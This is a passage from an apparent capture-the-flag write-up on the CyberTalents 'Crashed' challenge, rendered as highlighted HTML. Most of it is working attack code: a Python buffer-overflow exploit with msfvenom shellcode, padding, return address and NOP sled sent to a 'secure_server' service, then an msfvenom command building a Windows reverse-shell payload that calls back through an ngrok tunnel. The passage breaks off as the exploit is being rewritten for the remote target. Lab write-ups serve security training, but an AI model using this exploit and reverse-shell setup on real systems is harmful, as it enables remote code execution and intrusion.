buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">2c"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">cb"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">84"</span>
</pre></table></code></div></div><p>Now, let’s add our shell code to our final exploit.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb8\xa9\x88\x23\xc6\xdb\xd5\xd9\x74\x24\xf4\x5b\x29</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\xea\x86\xc1</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x33\x10\x7e\x87\xbc\xe8\x7f\xe8\x35\x0d\x4e\x28\x21</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x46\xe1\x98\x21\x0a\x0e\x52\x67\xbe\x85\x16\xa0\xb1</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x2e\x9c\x96\xfc\xaf\x8d\xeb\x9f\x33\xcc\x3f\x7f\x0d</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x1f\x32\x7e\x4a\x42\xbf\xd2\x03\x08\x12\xc2\x20\x44</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xaf\x69\x7a\x48\xb7\x8e\xcb\x6b\x96\x01\x47\x32\x38</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa0\x84\x4e\x71\xba\xc9\x6b\xcb\x31\x39\x07\xca\x93</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x73\xe8\x61\xda\xbb\x1b\x7b\x1b\x7b\xc4\x0e\x55\x7f</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x79\x09\xa2\xfd\xa5\x9c\x30\xa5\x2e\x06\x9c\x57\xe2</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd1\x57\x5b\x4f\x95\x3f\x78\x4e\x7a\x34\x84\xdb\x7d</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x9a\x0c\x9f\x59\x3e\x54\x7b\xc3\x67\x30\x2a\xfc\x77</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x9b\x93\x58\xfc\x36\xc7\xd0\x5f\x5f\x24\xd9\x5f\x9f</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x22\x6a\x2c\xad\xed\xc0\xba\x9d\x66\xcf\x3d\xe1\x5c</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb7\xd1\x1c\x5f\xc8\xf8\xda\x0b\x98\x92\xcb\x33\x73</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x62\xf3\xe1\xd4\x32\x5b\x5a\x95\xe2\x1b\x0a\x7d\xe8</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x93\x75\x9d\x13\x7e\x1e\x34\xee\xe9\xe1\x61\xf1\xed</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x89\x73\xf1\xfc\x15\xfd\x17\x94\xb5\xab\x80\x01\x2f</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf6\x5a\xb3\xb0\x2c\x27\xf3\x3b\xc3\xd8\xba\xcb\xae</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xca\x2b\x3c\xe5\xb0\xfa\x43\xd3\xdc\x61\xd1\xb8\x1c</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xef\xca\x16\x4b\xb8\x3d\x6f\x19\x54\x67\xd9\x3f\xa5</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf1\x22\xfb\x72\xc2\xad\x02\xf6\x7e\x8a\x14\xce\x7f</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x96\x40\x9e\x29\x40\x3e\x58\x80\x22\xe8\x32\x7f\xed</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x7c\xc2\xb3\x2e\xfa\xcb\x99\xd8\xe2\x7a\x74\x9d\x1d</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb2\x10\x29\x66\xae\x80\xd6\xbd\x6a\xa0\x34\x17\x87</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x49\xe1\xf2\x2a\x14\x12\x29\x68\x21\x91\xdb\x11\xd6</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x89\xae\x14\x92\x0d\x43\x65\x8b\xfb\x63\xda\xac\x29</span><span class="sh">"</span>


<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">998</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\xA0\x12\x50\x62</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">147</span> <span class="o">+</span> <span class="n">buf</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.1.6</span><span class="sh">"</span><span class="p">,</span> <span class="mi">13337</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">"</span><span class="s">SECRET</span><span class="sh">"</span><span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><p>We used an encoder to generate the payload, so a space in memory is needed for the payload to unpack! that is why we have added <code class="language-plaintext highlighter-rouge">"\x90"</code></p><p>By running our exploit we will receive a reverse shell successfully. but still we have obtained a reverse shell in our local machine we need to run this exploit to the Crashed Machine to get the Flag.</p><h2 id="root"><strong>Root</strong></h2><h3 id="ip-tunneling"><strong>IP tunneling</strong></h3><p>I tried to run the same exploit but on the real machine but I didn’t receive a reverse shell back. the problem was that the IP address of the machine is public IP and as my network behind NAT/Firewall we need to figure out a solution to get a successful reverse shell.This is could be achieved by many scenarios</p><ul><li><p>Using VPS with public IP and exposed to the internet to receive the reverse shell response to a specified port, This is a costly solution.</p><li><p>Configure a port forward method on my network router, this requires admin access to the Router/Modem and some advanced configuration.</p><li><p>The ultimate solution is to use the application to tunnel all the traffic to my host.</p></ul><p>The easiest solution here is to use Ngrok which is an application to tunnel the traffic of a public IP through your machine It can be set up easily by seeing the documentation.</p><p><a href="https://ngrok.com/">https://ngrok.com/</a></p><p>I will run Ngrok in my Linux machine to tunnel the traffic in my localhost at port 9001.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>root@kali:~# /ngrok tcp 9001
ngrok by @inconshreveable                                                                                             <span class="o">(</span>Ctrl+C to quit<span class="o">)</span>
                                                                                                                                 
Session Status                online                                                                                                
Account                       Muhammad <span class="o">(</span>Plan: Free<span class="o">)</span>                                                                                   
Version                       2.3.40                                                                                                  
Region                        United States <span class="o">(</span>us<span class="o">)</span>                                                                                      
Web Interface                 http://127.0.0.1:4040                                                                                   
Forwarding                    tcp://8.tcp.ngrok.io:11581 -&gt; localhost:9001                                                                                                                                                      
Connections                   ttl     opn     rt1     rt5     p50     p90                                                             
                              6       0       0.00    0.00    0.00    282.54 
</pre></table></code></div></div><p>‌</p><h2 id="remote-exploit"><strong>Remote Exploit</strong></h2><p>Now, the final step is that we need to edit the IP of the reverse shell. we will add the IP and the port of ngrok to receive the reverse shell in it then he will tunnel to our local machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>8.tcp.ngrok.io <span class="nv">LPORT</span><span class="o">=</span>11581 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> py <span class="nt">-a</span> x86 –platform windows <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf <span class="o">=</span>  b<span class="s2">""</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">31"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">63"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">ed"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">04"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">38"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">26"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">7b"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">44"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">aa"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">5c"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">aa</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">be"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">04"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">cc"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">32"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">37"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">a5"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">13"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">a1"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">71"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">0f"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">5f"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">01"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">b5"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">2a"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">dd"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">54"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">f1"</span>
</pre></table></code></div></div><p>Then we will edit our exploit to look like that, note that the secure_server is running in the remote machine at port 1887 so we have to change it also:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
